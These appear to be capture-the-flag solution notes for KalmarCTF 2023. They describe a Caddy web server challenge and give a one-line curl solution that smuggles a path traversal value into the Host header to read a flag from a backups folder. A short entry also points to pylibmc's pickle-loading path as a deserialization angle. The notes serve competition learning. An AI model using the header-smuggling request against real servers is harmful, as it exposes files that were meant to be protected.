# KalmarCTF 2023

> Welcome to KalmarCTF 2023, brought to you by the Kalmarunionen
> The competition will take place on Fri, 03 Mar. 2023, 17:00 UTC to Sun, 05 Mar. 2023, 17:00 UTC. For more information and to register, visit our website at KalmarC.TF
> We are thrilled to announce that Hex-Rays will be the main sponsor of KalmarCTF 2023.
> This year's competition will feature a variety of categories including pwn, crypto, web, rev, and of course miscgang will deliver.
> Don't miss out on the opportunity to test your skills and compete against the best in the field. Register now at KalmarC.TF and we'll see you at KalmarCTF 2023!
> Now with discord: https://discord.gg/kalmarctf

## Organizing

blahi

## Challenge: `Ez ⛳`

> Heard 'bout that new 🏌️-webserver? Apparently HTTPS just works(!), but seems like _someone_ managed to screw up the setup, woops.  The flag.txt is deleted until I figure out that HTTPS and PHP stuff #hacker-proof

Challenge setup:

`caddy:2.4.5-alpine`  -- this was the newest version of caddy when making this challenge.

File structure:

```
├── Caddyfile
├── php.caddy.chal-kalmarc.tf
│   ├── flag.txt
│   └── index.php
├── static.caddy.chal-kalmarc.tf
│   └── logo_round.svg
└── www.caddy.chal-kalmarc.tf
    └── index.html
```

docker-compose will create a wildcard cert, create a backup of all `*.caddy.chal-kalmarc.tf` folders into `backup/` and finally _delete `flag.txt`_.

```bash
apk add --update openssl nss-tools     && \
rm -rf /var/cache/apk/                 && \
openssl req -x509 -batch -newkey rsa:2048 -nodes -keyout /etc/ssl/private/caddy.key -days 365 -out /etc/ssl/certs/caddy.pem -subj '/C=DK/O=Kalmarunionen/CN=*.caddy.chal-kalmarc.tf' && \
mkdir -p backups/                      && \
cp -r *.caddy.chal-kalmarc.tf backups/ && \
rm php.caddy.chal-kalmarc.tf/flag.txt  && \
sleep 1                                && \
caddy run
```

So the running system has this folder structure:

```
/srv/
├── Caddyfile
├── backups
│   ├── php.caddy.chal-kalmarc.tf
│   │   ├── flag.txt
│   │   └── index.php
│   ├── static.caddy.chal-kalmarc.tf
│   │   └── logo_round.svg
│   └── www.caddy.chal-kalmarc.tf
│       └── index.html
├── php.caddy.chal-kalmarc.tf
│   └── index.php
├── static.caddy.chal-kalmarc.tf
│   └── logo_round.svg
└── www.caddy.chal-kalmarc.tf
    └── index.html
```

The important part of the `Caddyfile` is:

```
*.caddy.chal-kalmarc.tf {
    # block accidental exposure of flags:
    respond /flag.txt 403

    file_server {
        root /srv/{host}/
    }
}
```

Solution: `curl -k --path-as-is http://php.caddy.kalmarc.tf//flag.txt -H 'Host: backups/php.caddy.kalmarc.tf'`




## Challenge: `Healthy Calc`

[`PYLIBMC_FLAG_PICKLE`](https://github.com/lericson/pylibmc/blob/8c0f6714ea59b270782dfcc3755b5de0f3278737/src/_pylibmcmodule.h#L75)

Flow is:
 `_PylibMC_Unpickle_Bytes` calls `_PylibMC_Unpickle_Bytes` calls `PyObject_CallFunctionObjArgs(_PylibMC_pickle_loads, val, NULL)`


